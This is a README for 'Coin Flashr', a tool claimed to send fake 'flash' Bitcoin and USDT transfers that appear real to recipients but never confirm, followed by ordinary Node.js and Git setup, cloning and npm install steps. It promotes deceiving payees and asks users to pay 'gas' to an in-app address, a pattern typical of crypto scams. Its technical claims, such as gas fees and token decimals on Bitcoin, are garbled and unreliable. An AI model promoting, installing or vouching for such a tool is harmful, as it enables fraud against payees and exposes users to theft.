## Understanding Bitcoin Flashing

### What is Bitcoin flashing?

Bitcoin flashing primarily refers to a technique where an attacker creates the illusion of a successful Bitcoin transaction, but the funds never actually materialize or are quickly reversed. Bitcoin flashing is a practice of sending Bitcoin from one wallet to another in a transaction that will be rendered invalid in the long run. This is achieved either by manipulating the transaction signature, gas fees, or altering the token decimals programatically.

### Bitcoin flashing software

Coin Flashr is a software application that lets users perform dummy transactions with multiple variants of Bitcoin (including Bitcoin Fantom and Wrapped Bitcoin) and USDT (ERC20, BEP20, and TRC20). We developed this software mainly as a proof-of-concept, and only for demonstration purposes. The setup and utilization is entirely dummyproof. Flash tokens have a limited usage range, and they can not be swapped simply due to a lack of liquidity. The practical use case is transfers between cold and hardware wallets. The bitcoin can be sent to an exchange platform, but confirmation will never happen. Flash tokens are identical to the real deal until the user studies the underlying code or attempt to swap them.

The user will have a limited spendable quota of either Bitcoin or USDT, and is responsible for the gas fee for the flashing transactions. The user will find a gas address in-app and the gas topup process is simple.

### Bitcoin flashing source code

Bitcoin flashing source code is available for instant download as a zip file through curl on the terminal. Details available in-app.

## Prerequisites
This application requires [Node.js](https://nodejs.org) to run.

### Windows

Download the Node.js setup application [here](https://nodejs.org/en/download/).

### Linux

Run this code in terminal. You may need superuser privileges (sudo).

```sh
apt install nodejs
```

### MacOS

Install Homebrew (if you don't have it). Open the terminal and run:

```sh
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
```

Once Homebrew is installed, you can install Node.js by running:

```sh
brew install node
```

## Git Installation

Before installing Coin Flashr, ensure you have Git installed on your system. Follow the instructions below for your operating system.

## Windows

### Method 1: Using Winget (Recommended)
```cmd
winget install Git.Git
```
### Method 2: Using Chocolatey
```cmd
choco install git
```

## MacOS

### Method 1: Using HOmebrew (Recommended)
```cmd
brew install git
```
### Method 2: Using Macports
```cmd
sudo port install git
```

## Linux

### Ubuntu/Debian
```cmd
sudo apt update && sudo apt install git
```

### CentOS/RHEL
```cmd
sudo yum install git
```

### Fedora
```cmd
sudo dnf install git
```

### Arch Linux
```cmd
sudo pacman -S git
```

### openSUSE
```cmd
sudo zypper install git
```

### Verification 

After installation, verify Git is installed correctly:
```cmd
git --version
```

You should see output similar to: git version 2.x.x

## Installation

1. Clone the repository:

```sh
git clone https://github.com/flash-bitcoin-software/public-release && cd public-release
```

2. Install necessary dependencies:

```sh
npm install && npm install electron
```

## Usage

```sh
npm start
```
Gas is required for every non-bitcoin (USDT, wBTC) flashing event.




